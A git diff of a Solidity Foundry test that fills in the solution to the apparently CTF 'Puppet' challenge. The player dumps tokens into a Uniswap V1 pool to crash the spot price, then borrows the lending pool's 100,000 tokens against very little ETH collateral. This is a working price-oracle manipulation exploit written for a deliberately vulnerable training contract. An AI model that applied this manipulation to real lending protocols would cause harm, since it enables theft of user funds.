@@ -91,8 +91,20 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppet() public checkSolvedByPlayer {
-        
+    function test_puppetV1() public checkSolvedByPlayer {
+        token.approve(address(uniswapV1Exchange), 1000 ether);
+        uniswapV1Exchange.tokenToEthTransferInput(1000 ether, 1, block.timestamp + 1 days, player);
+
+        uint256 ethReserve = address(uniswapV1Exchange).balance;
+        uint256 dvtReserve = token.balanceOf(address(uniswapV1Exchange));
+        console.log("eth reserve = ", ethReserve);
+        console.log("token reserve = ", dvtReserve);
+        console.log("eth/token = ", ethReserve/dvtReserve);
+        console.log("pool's balance = ", token.balanceOf(address(lendingPool)));
+
+        lendingPool.borrow{value: player.balance}(100_000 ether, recovery);
+
+        new DamnValuableToken();
     }
 
     // Utility function to calculate Uniswap prices
